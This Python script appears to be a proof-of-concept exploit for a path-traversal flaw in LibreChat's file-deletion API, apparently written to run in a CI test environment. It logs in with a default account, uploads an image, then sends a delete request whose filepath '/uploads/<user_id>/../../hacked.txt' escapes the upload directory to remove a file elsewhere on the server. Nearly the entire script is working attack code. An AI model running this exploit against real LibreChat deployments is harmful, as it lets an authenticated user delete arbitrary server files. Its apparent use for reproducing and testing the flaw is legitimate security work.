import requests
import json
import sys

IS_CI_RUN = sys.argv[1] if len(sys.argv) > 1 else False

if IS_CI_RUN:
    BASE_URL = "http://librechat:3080"
    HOST = "librechat:3080"
else:
    BASE_URL = "http://localhost:3080"
    HOST = "localhost:3080"

UPLOAD_URL = BASE_URL + "/api/files/images"
FILE_URL = BASE_URL + "/api/files"
LOGIN_URL = BASE_URL + "/api/auth/login"

def login(username, password):
    data = {
        "email": username,
        "password": password  
    }
    print(LOGIN_URL)
    res = requests.post(LOGIN_URL, json=data)
    print(res.text)
    res_json = json.loads(res.text)
    token = res_json["token"]
    user_id = res_json["user"]["_id"]
    return token

def uploadFile(token):
    headers = {      
	"Authorization": f"Bearer {token}",          
	"Origin": BASE_URL,
	"Referer": BASE_URL + "/c/new",                                                                   
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Host": HOST}

    data = {"file_id": "7e372c69-065f-4ea1-bcd4-d0d81fb32bc4",'endpoint': 'local', 'width': 360, 'height': 276}
    files_json = {'file': open('test.png','rb')}
    res = requests.post(UPLOAD_URL, headers = headers, files = files_json, data = data)
    res_json = json.loads(res.text)
    print(res_json)
    return res_json["message"] == "File uploaded and processed successfully"


def getFileInfo(token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/c/new",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Host": HOST}

    res = requests.get(FILE_URL, headers = headers)
    print(res.text)
    res_json = json.loads(res.text)
    file_info = {}
    file_info['user_id'] = res_json[0]["user"]
    file_info['file_id'] = res_json[0]["file_id"]
    file_info['file_path'] = res_json[0]["filepath"]
    return file_info

def deleteFile(token, file_info):
    headers = {           
	"Authorization": f"Bearer {token}",
	"Content-Type": "application/json",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/c/new",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Host": HOST}

    files = []
    filepath = "/uploads/" + file_info['user_id'] + "/../../hacked.txt"
    print(filepath)
    files.append({"source": "local","file_id": file_info["file_id"], "filepath": filepath})
    data = {"files": files}
    res = requests.delete(FILE_URL, headers = headers, json = data)
    print(res)
    print(res.text)
    res_json = json.loads(res.text)
    print(res_json)
    return res_json["message"] == "Files deleted successfully"

if __name__ == "__main__":
    token  = login("email@email.com","test@123") # login with default account

    if not uploadFile(token):
      print("Upload file failed")
      sys.exit(1)
        
    file_info = getFileInfo(token)

    if not deleteFile(token, file_info):
      print("Delete file failed")
      deleteFile(token, file_info)
      sys.exit(1)

    sys.exit(0)